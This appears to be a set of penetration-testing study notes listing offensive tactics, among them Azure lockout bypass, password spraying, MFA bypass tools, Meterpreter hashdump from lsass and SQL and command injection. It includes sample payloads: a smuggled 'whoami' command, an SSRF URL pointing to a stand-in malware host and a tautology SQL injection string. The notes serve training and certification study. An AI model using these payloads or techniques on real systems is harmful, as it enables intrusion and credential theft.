# OCO TTPs

## Azure
- **Azure smart lockout bypass** - Rotate the source IP address.
- **Azure blobs enumeration** - An attacker can leverage DNS logging to enumerate Azure blobs.
- **Information needed to enumerate Azure Cloud storage with default URL**: Account and container names.
- **AADInternals** - PowerShell module to collect information from Azure, including reconnaissance data.

## BeEF
- Default file name is `hook.js` to deliver to the victim.

## Certutil
- **Living Off the Land (LOL) tools** - Can be used instead of cURL or Wget.

## Command Injection
- **Linux**: `foo.jpg; whoami`.

## Cross-Site Scripting (XSS)
- **Best attack vector** - User-generated message board.
- **Reflected XSS attack** - Requires some social engineering and exploiting web server–side input processing weaknesses to attack a user, exploiting a vulnerability in the server.

## Drive-By Attacks
- Exploit a user browsing the internet through a seemingly innocuous website.
- The user connects to a webpage that contains code to exploit the victim's browser.

## Golden Ticket
- Once achieved, all invalid accounts will be allowed.

## MFASweep
- **MFASweep usage** - Uses a valid username and password combination (possibly recovered from MSOLSpray) and tests different authentication endpoints publicly accessible for Microsoft 365 users to bypass MFA.

## MSOLSpray
- **Proxy URL** - An argument supplied to `msolspray` to use as an AWS API gateway generated by tools like Fireprox.

## Nmap
- **Nmap NSE script argument**: `--script-help "http*"` - Describes how to use the named script(s).
- **Default scan type with root access**: TCP SYN scan.
- **ICMP timestamp or address mask request discovery scan** - May produce different results from ICMP echo request discovery scan during network reconnaissance due to firewall blocking echo request/reply packets.

## Password Attacks
- **Credential stuffing** - Uses passwords from breach dumps against target accounts.
- **Password spraying** - Increases chances of getting into a system without locking user accounts. Bad login counter timer is crucial.
- **First step in password-cracking attacks**: Exploit a low-to-medium importance target.

## Reverse Shell
- **SSH** - Allows an attacker to connect to a specific port and IP address to pivot.

## SSRF (Server-Side Request Forgery)
- This attack can significantly impact cloud targets by disclosing instance metadata.
- **Exploitation indicator** - `curl` of `/etc/shadow`.
- Example: `login.asdf.com/?a=server1&b=http://malware.com/scripts/gotcha.php`.

## SQL Injection
- **SQL statement parts**: Verb, Source, and Refinement.
- **Common SQL attack** - Targets the supporting database of an application.
- **Terminate a SQL query** - Use `;`.
- **Initial experimentation** - Start with quotes: `' "`.
- Example: `Dkrier’ OR ‘k’=’k`.
- **UNION SQL clause** - Can be used to combine new SQL queries with prior query results.

## Smbclient
- Lists Windows shares from a Linux machine.

## TLS-Scan
- Extracts certificate information from identified servers on a given port.

## Watering Hole Attacks
- Target a specific victim group, compared to a drive-by.
- Example file type for attack: `.docm` - Microsoft Office files with malicious macros.
- Example attack: Spreadsheet with malicious macros placed on a financial analysis website.

## DNS Zone Transfer
- The process intended for replication from primary DNS to backup DNS servers. An attacker can obtain all records associated with a DNS domain if compromised.
- **Review the NS records** before requesting a zone transfer.

---

## Meterpreter
- **Hashdump** - Migrate to the `lsass.exe` process and run `hashdump` to obtain hashes from memory.

## Circumventing Password Managers
- Retrieve passwords copied to the clipboard.

## Code Wrapping
- Use third-party programming libraries to encode one language as another.
